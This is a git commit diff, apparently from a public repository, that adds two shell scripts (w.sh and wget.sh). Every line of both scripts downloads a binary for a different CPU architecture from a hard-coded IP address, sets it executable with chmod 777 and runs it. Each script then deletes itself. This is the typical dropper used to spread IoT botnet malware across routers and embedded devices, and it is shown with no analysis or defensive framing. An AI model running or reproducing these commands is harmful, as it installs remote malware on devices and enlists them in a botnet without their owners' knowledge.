1ae04802d022b3537120ff3317a0de84c8380251
syncvmpurchase <syncvmpurchase@gmail.com>
2025-07-25 19:12:19 -0300

    Add files via upload

---
+++ w.sh
@@ -0,0 +1,12 @@
+busybox wget http://209.14.88.76/sync.arm; chmod 777 sync.arm; ./sync.arm android
+busybox wget http://209.14.88.76/sync.arm5; chmod 777 sync.arm5; ./sync.arm5 android
+busybox wget http://209.14.88.76/sync.arm6; chmod 777 sync.arm6; ./sync.arm6 android
+busybox wget http://209.14.88.76/sync.arm7; chmod 777 sync.arm7; ./sync.arm7 android
+busybox wget http://209.14.88.76/sync.m68k; chmod 777 sync.m68k; ./sync.m68k android
+busybox wget http://209.14.88.76/sync.mips; chmod 777 sync.mips; ./sync.mips android
+busybox wget http://209.14.88.76/sync.mipsel; chmod 777 sync.mipsel; ./sync.mipsel android
+busybox wget http://209.14.88.76/sync.powerpc; chmod 777 sync.powerpc; ./sync.powerpc android
+busybox wget http://209.14.88.76/sync.sh4; chmod 777 sync.sh4; ./sync.sh4 android
+busybox wget http://209.14.88.76/sync.x86; chmod 777 sync.x86; ./sync.x86 android
+
+rm $0
---
+++ wget.sh
@@ -0,0 +1,13 @@
+wget http://209.14.88.76/sync.arm; chmod 777 sync.arm; ./sync.arm android
+wget http://209.14.88.76/sync.arm5; chmod 777 sync.arm5; ./sync.arm5 android
+wget http://209.14.88.76/sync.arm6; chmod 777 sync.arm6; ./sync.arm6 android
+wget http://209.14.88.76/sync.arm7; chmod 777 sync.arm7; ./sync.arm7 android
+wget http://209.14.88.76/sync.m68k; chmod 777 sync.m68k; ./sync.m68k android
+wget http://209.14.88.76/sync.mips; chmod 777 sync.mips; ./sync.mips android
+wget http://209.14.88.76/sync.mipsel; chmod 777 sync.mipsel; ./sync.mipsel android
+wget http://209.14.88.76/sync.powerpc; chmod 777 sync.powerpc; ./sync.powerpc android
+wget http://209.14.88.76/sync.sh4; chmod 777 sync.sh4; ./sync.sh4 android
+wget http://209.14.88.76/sync.spc; chmod 777 sync.spc; ./sync.spc android
+wget http://209.14.88.76/sync.x86; chmod 777 sync.x86; ./sync.x86 android
+
+rm $0
